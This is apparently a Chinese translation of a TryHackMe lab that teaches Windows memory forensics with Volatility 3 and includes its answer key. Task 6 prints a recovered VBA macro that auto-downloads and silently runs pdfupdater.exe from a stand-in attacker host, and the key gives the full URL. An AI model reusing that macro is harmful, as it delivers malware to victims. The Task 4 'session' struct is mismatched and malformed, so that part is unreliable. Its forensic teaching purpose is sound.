---
sidebar_position: 4
---

# Windows内存与用户活动

## 任务 1 介绍

在本房间中，我们将逐步介绍如何使用**Volatility 3**从**Windows内存转储**中调查用户活动。 作为分析师，了解在可疑事件发生时用户在系统上正在做什么非常重要。 这包括了解谁已登录、执行了什么命令、打开了哪些文件以及其他活动。

本房间是三部分系列中的第二部分。 我们将处理来自小型内部网络上受感染计算机的内存转储。 如果主机确实受到入侵，我们需要拼凑出攻击的范围和攻击链。

### 学习目标

- 使用会话和注册表数据将登录与可疑活动关联起来。
- 识别与可疑访问相关的命令和文件访问。
- 从内存中重建用户操作。

### 先决条件

- [Volatility](https://tryhackme.com/room/volatility)
- [Windows基础模块](https://tryhackme.com/module/windows-fundamentals)
- [内存分析简介](https://tryhackme.com/room/memoryanalysisintroduction)
- [Windows内存与进程](https://tryhackme.com/room/windowsmemoryandprocs)

:::info 回答以下问题

<details>

<summary> 点击继续进入房间。 </summary>

```plaintext
No answer needed
```

</details>

:::

## 任务2场景信息

### 场景

您是处理TryHatMe公司事件的事件响应团队的一员，该公司专门在线销售帽子。 您的任务是分析一个可能被入侵的Windows主机的完整内存转储。 在您之前，另一位分析师已经获取了完整的内存转储，并从TryHatMe的IT支持团队收集了所有必要信息。 由于这是您的第一个案例，您有点紧张，但别担心；一位资深分析师将指导您。

### 事件信息THM-0001

- 2025年5月5日07:30 CET，TryHatMe启动了其事件响应计划，并将事件上报给我们。 经过初步分类，我们的团队发现了一台可能被入侵的Windows主机。 主机的详细信息如下：
  - 主机名：WIN-001
  - 操作系统：Windows 1022H 10.0.19045
- 07:45 CET，我们的分析师Steve Stevenson获取了Windows主机的完整内存转储，并生成了哈希值以确保其完整性。 内存转储的详细信息如下：
  - 名称：`THM-WIN-001_071528_07052025.dmp`
  - MD5哈希：`78535fc49ab54fed57919255709ae650`

### 公司信息TryHatMe

#### 网络拓扑图

![显示当前场景为网络拓扑图，包含DMZ内部、用户局域网和服务器局域网网络](img/image_20251255-215557.png)

:::info 回答以下问题

<details>

<summary>我已阅读案例详情，准备好了解更多信息。 </summary>

```plaintext
No answer needed
```

</details>

:::

## 任务3 环境与设置

在继续之前，请点击右侧的启动机器按钮**启动虚拟机**。

大约需要2分钟才能正常加载。 虚拟机将在分屏的右侧可访问。 如果看不到虚拟机，请使用页面顶部的蓝色**显示分屏视图**按钮。

我们将继续分析位于用户**ubuntu**主目录中的内存转储**THM-WIN-001_071528_07052025.mem**。

:::info 回答以下问题

<details>

<summary> 如果您能够启动您的环境，请点击此处。 </summary>

```plaintext
No answer needed
```

</details>

:::

## 任务4 追踪会话

在本任务中，我们将研究如何找出在捕获内存时谁登录了系统。 这是任何调查的第一步之一，了解哪些用户账户存在并可能参与了我们感兴趣的活动。

Windows在内存中存储有关会话、交互式登录甚至应用程序使用情况的详细信息。

### 会话

在调查受感染系统时，了解当时哪些用户账户处于活动状态以及他们拥有何种类型的访问权限至关重要。 追踪会话使我们能够查看用户是物理在场、远程连接还是保持会话打开。 这有助于缩小哪些操作可归因于特定用户，以及账户在攻击期间是否被滥用。 会话数据还可以帮助区分常规活动与异常情况，例如在异常时间出现的会话，或来自意外来源/起源的会话。

Volatility插件通过定位内部Windows结构（其中一些未公开文档），如**_SESSION_MANAGER_INFORMATION**和[会话结构](https://learn.microsoft.com/en-us/windows/win32/devnotes/session)来检查内存。 让我们看看SESSION结构包含什么：

```c
struct SESSION{
    ACTION    act;
    HFILELIST hflist;
    BOOL      fAllCabinets;
    BOOL      fOverwrite;
    BOOL      fNoLineFeed;
    BOOL      fSelfExtract;
    long      cbSelfExtractSize;
    long      cbSelfExtractSize;
    int       ahfSelf[cMAX_CAB_FILE_OPEN];
    int       cErrors;
    HFDI      hfdi;
    ERF       erf;
    long      cFiles;
    long      cbTotalBytes;
    PERROR    perr;
    SPILLERR  se;
    long      cbSpill;
    char      achSelf[cbFILE_NAME_MAX];
    char      achMsg[cbMAX_LINE*2];
    char      achLine;
    char      achLocation;
    char      achFile;
    char      achDest;
    char      achCabPath;
    BOOL      fContinuationCabinet;
    BOOL      fShowReserveInfo;
    BOOL      fNextCabCalled;
    CABINET   acab[2];
    char      achZap[cbFILE_NAME_MAX];
    char      achCabinetFile[cbFILE_NAME_MAX];
    int       cArgv;
    char      **pArgv;
    int       fDestructive;
    USHORT    iCurrentFolder;
    SESSION, *PSESSION;
}
```

Windows**会话**插件（**windows.session**）遍历这些内核和用户会话管理结构，以提取会话ID、用户SID、登录类型（例如控制台、RDP）和登录时间戳等详细信息。 这些值存储在csrss.exe、winlogon.exe以及其他与交互式会话相关的系统进程的内存中。

### 已登录会话

我们可以使用Volatility探索会话。 让我们运行命令`vol -f THM-WIN-001_071528_07052025.mem windows.sessions > sessions.txt`，将输出保存到文件`sessions.txt`以供进一步分析。

```shell title="Terminal"
ubuntu@tryhackme$vol -f THM-WIN-001_071528_07052025.mem windows.sessions > sessions.txt
ubuntu@tryhackme$ cat sessions.txt 
Volatility 3 Framework 2.26.0

Session ID  Session Type  Process ID  Process Name        User Name                         Create Time
----------  ------------- ----------- ------------------- --------------------------------  -------------------------------
N/A         -             4           System              -                                 2025-05-07 07:08:48.000000 UTC
N/A         -             92          Registry            -                                 2025-05-07 07:08:44.000000 UTC
N/A         -             324         smss.exe            -                                 2025-05-07 07:08:48.000000 UTC

[REDACTED]
1           -             9264        msedge.exe          -                                 2025-05-07 07:09:11.000000 UTC
1           -             10100       SystemSettings      [redacted]                        2025-05-07 07:09:45.000000 UTC
1           -             6836        ApplicationFra      [redacted]                        2025-05-07 07:09:45.000000 UTC
1           -             8408        UserOOBEBroker      [redacted]                        2025-05-07 07:09:45.000000 UTC
1           -             3276        svchost.exe         [redacted]                        2025-05-07 07:10:51.000000 UTC
1           -             7376        TextInputHost.      [redacted]                        2025-05-07 07:11:36.000000 UTC
1           -             7468        dllhost.exe         [redacted]                        2025-05-07 07:11:36.000000 UTC
1           Console       5952        cmd.exe             [redacted]                        2025-05-07 07:12:43.000000 UTC
1           Console       3144        conhost.exe         [redacted]                        2025-05-07 07:12:43.000000 UTC
1           -             828         ShellExperienc      [redacted]                        2025-05-07 07:12:51.000000 UTC
1           -             3548        RuntimeBroker.      [redacted]                        2025-05-07 07:12:51.000000 UTC
1           Console       5252        WINWORD.EXE         [redacted]                        2025-05-07 07:13:04.000000 UTC
1           Console       3392        pdfupdater.exe      [redacted]                        2025-05-07 07:13:05.000000 UTC
1           Console       3932        ai.exe              [redacted]                        2025-05-07 07:13:05.000000 UTC
1           Console       2576        conhost.exe         [redacted]                        2025-05-07 07:13:05.000000 UTC
1           Console       10084       windows-update      [redacted]                        2025-05-07 07:13:05.000000 UTC
1           Console       10032       updater.exe         [redacted]                        2025-05-07 07:13:56.000000 UTC
1           Console       432         cmd.exe             [redacted]                        2025-05-07 07:14:36.000000 UTC
1           Console       4592        conhost.exe         [redacted]                        2025-05-07 07:14:36.000000 UTC
1           Console       6984        powershell.exe      [redacted]                        2025-05-07 07:14:39.000000 UTC
1           -             2572        SearchProtocol      [redacted]                        2025-05-07 07:15:23.000000 UTC
1           -             7788        FTK Imager.exe      [redacted]                        2025-05-07 07:15:28.000000 UTC
1           Console       9920        dllhost.exe         [redacted]                        2025-05-07 07:15:42.000000 UTC
N/A         -             1884        MemCompression      -                                 2025-05-07 07:08:49.000000 UTC
```

**注意**：首次运行Volatility时，启动需要几分钟

操作员用户会话（会话**ID 1**）因一系列明显的可疑操作而显得突出。 在几秒钟内，该用户下启动了一系列进程，指向主动参与而非后台任务。 时间线和一致的用户上下文表明会话被入侵，随后被攻击者使用。

- 可疑会话：与用户操作员相关的活动，会话**ID 1**。
- 恶意进程链：**WINWORD.EXE** → **pdfupdater.exe** → **windows-update.exe** → **updater.exe**。
- 所有进程都在同一交互式会话下执行。
- 后利用行为：cmd.exe（**PID 432**）和powershell.exe（**PID 6984**）出现在**updater.exe**之后。
- 攻击者可能获得控制权并开始发出命令。
- 证据指向在初始访问后被利用的劫持用户会话。

### 查找已加载的注册表配置单元

另一个需要检查的重要工件是[Windows注册表](https://learn.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry)，它保存了广泛的用户和系统配置数据，包括最近使用的文件、执行的程序、无线连接等详细信息。 当注册表配置单元（如**NTUSER.DAT**或**SYSTEM**）加载到内存中时，意味着用户处于活动状态并与系统交互。 通过识别在获取时内存中存在哪些注册表配置单元，我们可以将特定的用户行为与特定账户关联起来。

Volatility通过扫描内存中的**CMHIVE**内核结构实例来定位已加载的注册表配置单元（此结构未公开文档，但我们可以在[此处](https://www.nirsoft.net/kernel_struct/vista/CMHIVE.html)找到一些相关信息）。 这些配置单元通常在启动或用户登录期间由Windows内核加载到内存中。 **windows.registry.hivelist**插件遍历内核的HiveList。 每个条目包含配置单元的虚拟内存地址以及其在磁盘上的原始存储路径（例如，**C:\Users\\\<USERNAME>\\NTUSER.DAT**）。

让我们使用命令`vol -f THM-WIN-001_071528_07052025.mem windows.registry.hivelist > hivelist.txt`来检查并将输出保存到文件hivelist.txt，并分析输出：

```shell title="Terminal"
ubuntu@tryhackme$ vol -f THM-WIN-001_071528_07052025.mem windows.registry.hivelist > hivelist.txt
ubuntu@tryhackme$ cat hivelist.txt
Volatility 3 Framework 2.26.0

Offset              FileFullPath                                                                                                                                            File output

0xbe8c63e66000                                                                                                                                                              Disabled
0xbe8c63e7d000      \REGISTRY\MACHINE\SYSTEM                                                                                                                                Disabled
[REDACTED]
0xbe8c6867b000      \??\C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\DeliveryOptimization\State\dosvcState.dat                                 Disabled
0xbe8c6878d000      \??\C:\Users\operator\ntuser.dat                                                                                                                        Disabled
0xbe8c68796000      \??\C:\Users\operator\AppData\Local\Microsoft\Windows\UsrClass.dat                                                                                      Disabled
0xbe8c69c6c000      \??\C:\Windows\AppCompat\Programs\Amcache.hve                                                                                                           Disabled
0xbe8c6a63a000      \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\MicrosoftWindows.Client.CBS_1000.19061.1000.0_x64__cw5n1h2txyewy\ActivationStore.dat        Disabled
[REDACTED]
```

如上输出所示，我们可以确认用户操作员的注册表配置单元在获取内存转储时已完全加载到内存中，包括主要的**ntuser.dat**文件以及**UsrClass.dat**下的相关用户特定应用程序设置。 这强烈表明操作员账户不仅已登录，而且正在主动与系统交互，但并未显示任何潜在的交互发生。

来自`AppData\Local\Packages`路径的几个注册表条目显示访问或配置了现代Windows UWP应用程序的痕迹，例如**StartMenuExperienceHost**、**Search**、**ShellExperienceHost**和**LockApp**，所有这些都与用户**操作员**相关联。 这些用户配置单元在内存中的存在支持了活动进程树引起的怀疑，特别是因为此用户与涉及**WINWORD.EXE**、pdfupdater.exe以及可能的后期利用阶段的可疑进程相关。

### 图形界面活动

[**UserAssist**](https://www.magnetforensics.com/blog/artifact-profile-userassist/)，一个未公开文档的注册表，用于追踪用户通过图形界面启动的可执行文件，帮助我们了解用户通过图形界面与哪些程序交互。 它追踪从**开始菜单**、**桌面**或**资源管理器**启动的应用程序，包括**cmd.exe**、**powershell.exe**和自定义可执行文件等工具。 我们可以使用此信息来确定用户实际运行了什么，即使执行的证据已从磁盘或事件日志中消失。 在入侵前不久在**UserAssist**中看到类似**powershell.exe**或**regsvr32.exe**的内容可以表明直接的用户驱动活动，这在尝试确定意图并将操作追踪到特定账户时至关重要。 这种技术被**Raspberry Robin蠕虫**等威胁行为者在实际攻击中使用。

Volatility中的**windows.registry.userassist**插件从**NTUSER.DAT**配置单元读取，这是一个Windows注册表配置单元文件，存储用户的设置和偏好，特别是在**Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist**键下。 每个条目都是**ROT13编码的**，并包含应用程序路径、运行计数器和上次启动时间戳等详细信息。

让我们执行命令`vol -f THM-WIN-001_071528_07052025.mem windows.registry.userassist > userassist.txt`，并通过`cat userassist.txt`查看输出来进行调查

```shell TITLE="Terminal"
ubuntu@tryhackme$ cat userassist.txt
Volatility 3 Framework 2.26.0

Hive Offset    Hive Name    Path    Last Write Time    Type    Name    ID    Count    Focus Count    Time Focused    Last Updated    Raw Data

0xbe8c6878d000    \??\C:\Users\operator\ntuser.dat    ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{9E04CAB2-CC14-11DF-BB8C-A2F1DED72085}\Count    2025-04-30 05:44:06.000000 UTC    Key    N/A    N/A    N/A    N/A    N/A    N/A    N/A
[REDACTED]
%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Accessories\Notepad.lnk    N/A    6    0    0:00:00.506000    2025-05-07 06:55:48.000000 UTC    
00 00 00 00 06 00 00 00 00 00 00 00 06 00 00 00 ................
00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................
00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................
00 00 80 bf 00 00 80 bf ff ff ff ff 50 30 5b 10 ............P0[.
1d bf db 01 00 00 00 00                         ........        
* 0xbe8c6878d000    \??\C:\Users\operator\ntuser.dat    ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\Count    2025-05-07 07:15:27.000000 UTC    Value    C:\Users\Public\Desktop\Google Chrome.lnk    N/A    9    0    0:00:00.509000    2025-05-07 06:58:07.000000 UTC    
00 00 00 00 09 00 00 00 00 00 00 00 09 00 00 00 ................
00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................
00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................
00 00 80 bf 00 00 80 bf ff ff ff ff a0 82 5b 63 ..............[c
1d bf db 01 00 00 00 00                         ........        
* 0xbe8c6878d000    \??\C:\Users\operator\ntuser.dat    ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\Count    2025-05-07 07:15:27.000000 UTC    Value    %APPDATA%\Microsoft\Windows\Start Menu\Programs\System Tools\Command Prompt.lnk    N/A    33    0    0:00:00.533000    2025-05-07 07:12:43.000000 UTC    
00 00 00 00 21 00 00 00 00 00 00 00 21 00 00 00 ....!.......!...
00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................
00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................
00 00 80 bf 00 00 80 bf ff ff ff ff 20 ce 3d 6d ............ .=m
1f bf db 01 00 00 00 00                         ........        
* 0xbe8c6878d000    \??\C:\Users\operator\ntuser.dat    ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\Count    2025-05-07 07:15:27.000000 UTC    Value    %APPDATA%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\File Explorer.lnk    N/A    28    0    0:00:00.528000    2025-05-07 07:11:17.000000 UTC    
00 00 00 00 1c 00 00 00 00 00 00 00 1c 00 00 00 ................
00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................
00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................
00 00 80 bf 00 00 80 bf ff ff ff ff 70 ed 3d 3a ............p.=:
1f bf db 01 00 00 00 00                         ........        
* 0xbe8c6878d000    \??\C:\Users\operator\ntuser.dat    ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\Count    2025-05-07 07:15:27.000000 UTC    Value    C:\Users\Public\Desktop\AccessData FTK Imager.lnk    N/A    6    0    0:00:00.506000    2025-05-07 07:15:27.000000 UTC    
00 00 00 00 06 00 00 00 00 00 00 00 06 00 00 00 ................
00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................
00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf ................
00 00 80 bf 00 00 80 bf ff ff ff ff 20 be be ce ............ ...
1f bf db 01 00 00 00 00                         ........        
* 0xbe8c6878d000    \??\C:\Users\operator\ntuser.dat    ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\Count    2025-05-07 07:15:27.000000 UTC    Value    %ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Word.lnk    N/A    0    0    0:00:00.500000    N/A    
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
00 00 00 00 9a 94 ce bf 00 00 00 00 00 00 00 00 ................
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
00 00 00 00 25 a2 0b 17                         ....%...        
0xbe8c6878d000    \??\C:\Users\operator\ntuser.dat    ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{FA99DFC7-6AC2-453A-A5E2-5E2AFF4507BD}\Count    2025-04-30 05:44:06.000000 UTC    Key    N/A    N/A    N/A    N/A    N/A    N/A    N/A
```

如上所示，来自操作员用户注册表配置单元的UserAssist数据揭示了与我们怀疑的攻击链一致的关键应用程序的执行情况。 值得注意的是，引用**Command Prompt.lnk**的条目显示在**07:12:43**左右的活动，这与会话数据中看到的**cmd.exe**启动直接对应。 这进一步证实了用户或通过其会话进行攻击的攻击者在执行可疑进程（如**WINWORD.EXE**、pdfupdater.exe和updater.exe）之前或期间与系统进行了交互。 这些痕迹有助于确认与入侵相关的操作是从一个活跃的桌面会话启动的，表明这是有意的、由用户驱动的执行。

很好，既然我们已经学习了如何从会话中获取信息，让我们继续下一个任务。

:::info 回答以下问题

<details>

<summary> 应该使用哪个插件来从内存中识别用户登录会话？ </summary>

```plaintext
windows.sessions
```

</details>

<details>

<summary> 当WINWORD.EXE和updater.exe执行时，哪个用户登录到了控制台会话？ </summary>

```plaintext
DESKTOP-3NMNM0H/operator
```

</details>

<details>

<summary> 根据UserAssist数据，哪个与命令行活动相关的可执行文件是通过快捷方式启动的？ </summary>

```plaintext
cmd.exe
```

</details>

<details>

<summary> 哪个Volatility 3插件揭示了用户通过图形界面启动程序的证据？ </summary>

```plaintext
windows.registry.userassist
```

</details>

:::

## 任务5 命令执行与文件访问

既然我们已经看到了可能的恶意活动是如何开始的，现在是时候检查之后发生了什么。 我们将调查命令执行情况，并识别攻击序列中涉及的任何进程访问了哪些文件。

我们已经确定执行始于**WINWORD.EXE**并导致了updater.exe。 我们现在的目标是确定这些组件中是否有任何一个执行了命令、通过控制台与系统交互，或者访问了可能已暂存或收集的文件。

### 执行

让我们首先使用Volatility的**cmdline**插件来检查获取内存转储时执行的命令或程序。 cmdline插件的工作原理是遍历内存中的每个进程并访问每个进程环境块（[PEB](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)）。 在**PEB**内部，有一个名为[ProcessParameters](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters)的结构，它包含一个指向用于启动进程的命令行Unicode字符串的指针。

```c
typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine; // This is the string it reads
    RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
}
```

该插件直接从内存中读取此字符串。 让我们使用上述插件通过以下命令调查进程和文件执行情况：

`vol -f THM-WIN-001_071528_07052025.mem windows.cmdline  > cmdline.txt`

上述命令将把命令的输出保存到文件**cmdline.txt**中。 我们可以分析它以寻找可疑信息。

```shell title="Terminal"
ubuntu@tryhackme$ cat cmdline.txt 
Volatility 3 Framework 2.26.0

PID    Process    Args

4    System    -
92    Registry    -
324    smss.exe    \SystemRoot\System32\smss.exe
[REDACTED]
6964    audiodg.exe    C:\Windows\system32\AUDIODG.EXE 0x2fc
5252    WINWORD.EXE    "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\operator\Documents\[REDACTED].docm" /o ""
2404    svchost.exe    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc
2072    svchost.exe    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost
2232    SearchProtocol    "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe1_ Global\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" 
3392    pdfupdater.exe    C:\Users\operator\pdfupdater.exe
3932    ai.exe    "C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe" "800FB58E-123D-47C9-86F8-DBF71EE67997" "B1B0FF84-8895-409C-B3BB-2C4A4087BED6" "5252" "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" "WordCombinedFloatieLreOnline.onnx"
2576    conhost.exe    \??\C:\Windows\system32\conhost.exe 0x4
10084    windows-update    "C:\Users\operator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows-update.exe"
[REDACTED]
7788    FTK Imager.exe    "C:\Program Files\AccessData\FTK Imager\FTK Imager.exe" 
9920    dllhost.exe    C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
5108    svchost.exe
```

我们可以观察到，没有一个潜在的恶意进程是使用命令执行的，但我们可以观察并确认进程**5252**对应的**WINWORD.EXE**被执行以打开一个**docm**文件（实际上，该文件可能是用户点击或打开的），如下所示：

`5252    WINWORD.EXE    "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\operator\Documents\[REDACTED].docm" /o ""`

这表明`WINWORD.EXE`是使用`.docm`文件（一个启用宏的文档）启动的。 使用`/n`表示启动了一个新实例，这通常用于避免重用现有窗口。

### 文件访问

我们可以通过使用handles插件查看此文件的句柄来确认上述情况，该插件通过解析每个进程的[EPROCESS](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess)结构中的`ObjectTable`字段引用的句柄表来提取打开的句柄。 每个条目映射到一个内核对象（文件、注册表键、事件等），插件遍历该表以解释它们。 这揭示了在内存转储时每个进程打开了哪些资源。

让我们尝试使用以下命令：

`vol -f THM-WIN-001_071528_07052025.mem windows.handles > handles.txt`

现在让我们检查保存输出的**handles.txt**的内容。

```shell title="Terminal"
ubuntu@tryhackme$ cat handles.txt |grep WINWORD
[REDACTED]

5252    WINWORD.EXE    0xbe8c69e24e20    0xd00    Key    0x20019    MACHINE\SOFTWARE\CLASSES\WOW6432NODE\CLSID\{76765B11-3F95-4AF2-AC9D-EA55D8994F1A}
5252    WINWORD.EXE    0x990b29014c60    0xd04    Event    0x1f0003    -
5252    WINWORD.EXE    0x990b289a55e0    0xd0c    Event    0x1f0003    -
5252    WINWORD.EXE    0x990b289a56e0    0xd10    Event    0x1f0003    -
5252    WINWORD.EXE    0x990b289a5760    0xd14    Event    0x1f0003    -
5252    WINWORD.EXE    0x990b265ae590    0xd18    WaitCompletionPacket    0x1    -
5252    WINWORD.EXE    0x990b2a79ae30    0xd1c    File    0x100001    \Device\KsecDD
5252    WINWORD.EXE    0x990b2ae08c20    0xd20    File    0x100001    \Device\HarddiskVolume3\Windows\System32\en-US\propsys.dll.mui
5252    WINWORD.EXE    0xbe8c69f5ff10    0xd24    Section    0x4    C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000003.db
5252    WINWORD.EXE    0x990b2a57ad90    0xd2c    ALPC Port    0x1f0001    -
5252    WINWORD.EXE    0x990b2ae0ab60    0xd30    File    0x12019f    \Device\HarddiskVolume3\Users\operator\Documents\[REDACTED].docm
5252    WINWORD.EXE    0x990b29d9cf60    0xd34    Event    0x1f0003    -

[REDACTED]
```

**注意**：此命令可能需要几分钟才能执行。

正如我们所见，该进程在`\Device\HarddiskVolume3\Users\operator\Documents\[REDACTED].docm`处打开或执行了该文件。 这表明该文件不仅仅是作为参数传递的。 它被进程主动打开了。 这为将此文档与后续活动联系起来提供了依据。

此时，为了获取更多关于发生了什么的信息，我们需要检查进程`WINWORD.EXE`，如果我们想有机会恢复关于此进程的更多信息。 我们将在下一个任务中完成此操作。

:::info 回答以下问题

<details>

<summary> 哪个文件被传递给了WINWORD.EXE？ </summary>

```plaintext
cv-resume-test.docm
```

</details>

<details>

<summary> 从进程句柄表中提取打开的文件、注册表键和内核对象的Volatility3插件叫什么名字？ </summary>

```plaintext
windows.handles
```

</details>

<details>

<summary> 在WINWORD.EXE的内存空间中，发现.docm文件打开的完整设备路径是什么？ </summary>

```plaintext
C:\Users\operator\Documents\cv-resume-test.docm
```

</details>

<details>

<summary> 使用了哪个Windows命令行开关在新实例中打开WINWORD.EXE？ </summary>

```plaintext
/n
```

</details>

:::

## 任务6 追踪用户执行

在调查的这一部分，我们将重新审视可能由同一个Word进程使用的模板文件。 这些模板通常包含嵌入的宏，并随启用宏的文档自动加载。 我们已经在之前的步骤中提取了此文件，但我们将在此处确认其类型并进行分析。 目标是检查此文件是否在触发进一步活动中发挥了作用。

### 定位模板文件

要转储进程加载或使用的文件，或进程本身，我们可以使用Volatility的**dumpfiles**插件，该插件提取在获取时存在于系统内存中的文件对象。 它的工作原理是通过扫描内存中的[FILE_OBJECT](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_object)结构，这些结构表示打开或最近访问的文件。 对于找到的每个有效文件对象，插件尝试跟随关联的[SectionObjectPointer](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_section_object_pointers)来定位并重建内存中映射的文件数据。

```c
typedef struct _SECTION_OBJECT_POINTERS {
    PVOID DataSectionObject;
    PVOID SharedCacheMap;
    PVOID ImageSectionObject;
    SECTION_OBJECT_POINTERS;
}
```

它使用对象的元数据（如文件名和偏移量）来适当地命名转储的文件。 如果文件的数据仍然驻留在内存中。

我们已经在之前的房间中转储了此文件，它应该在`5252/`目录中可用，但我们可以使用以下命令再次执行：

`vol -f THM-WIN-001_071528_07052025.mem -o 5252/ windows.dumpfiles --pid 5252`

一旦我们访问了该文件转储，我们就可以像之前识别具有潜力的**DOTM**文件时那样检查它。 通常，启用宏的文件，如**DOCM**，会在DOTM文件中包含模板。 这就是我们通过转储进程**WINWORD.EXE**在之前的任务中已经找到的文件类型。 我们可以使用grep命令再次搜索它：

```shell title="Terminal"
ubuntu@tryhackme$ ls 5252/|grep dotm
file.0x990b2ae077d0.0x990b2a3f5d70.SharedCacheMap.Normal.dotm.vacb
file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat
```

很好，那么让我们使用命令`cp 5252/file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat .`将文件复制到我们的主目录，并再次检查它，确认它是一个Word文档文件，就像我们之前使用`file`命令所做的那样，并确认文件类型为**Word**。

```shell title="Terminal"
ubuntu@tryhackme$ file file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat
file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat: Microsoft Word 2007+
```

### 确认宏执行

让我们使用命令`unzip`解压.dat文件，并检查文件。 让我们检查解压后的word/目录。 我们将找到一个名为**vbaProject.bin**的VBA文件。 如果有宏或潜在的恶意代码，它应该在那里，所以我们将使用`olevba`（**oletools**套件的一部分）通过命令`olevba word/vbaProject.bin`提取它

```shell title="Terminal"
ubuntu@tryhackme$ olevba word/vbaProject.bin 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
[REDACTED]
 
Sub AutoOpen()
    DownloadAndExecute
End Sub

Sub Document_Open()
    DownloadAndExecute
End Sub

Sub DownloadAndExecute()
    Dim url As String
    Dim filePath As String
    Dim xmlhttp As Object
    Dim adoStream As Object

    url = "http:/[REDACTED]/pdfupdater.exe"
    filePath = "C:\Users\operator\pdfupdater.exe"

    ' Delete file if it already exists
    If Dir(filePath) <> "" Then Kill filePath

    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
    xmlhttp.Open "GET", url, False
    xmlhttp.Send

    If xmlhttp.Status = 200 Then
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Type = 1 ' Binary
        adoStream.Open
        adoStream.Write xmlhttp.responseBody
        adoStream.SaveToFile filePath, 2 ' Overwrite existing
        adoStream.Close

        Shell filePath, vbHide ' Run the file silently
    Else
        MsgBox "Download failed. HTTP status: " & xmlhttp.Status
    End If
End Sub

[REDACTED]
```

很好。 我们成功地从内存中恢复了用户执行的宏，该宏很可能是通过文档传递的。 此宏启动了`pdfupdater.exe`的执行，并揭示了一个URL，可以帮助追踪活动的起源，我们将在接下来的任务中进一步探讨。

:::info 回答以下问题

<details>

<summary> 我们使用了哪个命令来确认转储的`.dat`文件是Microsoft Word文档？ </summary>

```plaintext
file
```

</details>

<details>

<summary> 根据`olevba`输出，宏下载并执行的文件叫什么名字？ </summary>

```plaintext
pdfupdater.exe
```

</details>

<details>

<summary> 宏中硬编码用于下载可执行文件的完整URL是什么？ </summary>

```plaintext
http://attacker.thm/pdfupdater.exe
```

</details>

:::

## 任务 7 结论

在这个房间中，我们仅通过内存分析了用户活动，追踪了登录、会话、命令和文件访问。 每个任务都侧重于交互的迹象，帮助我们理解事件期间系统上发生了哪些操作。

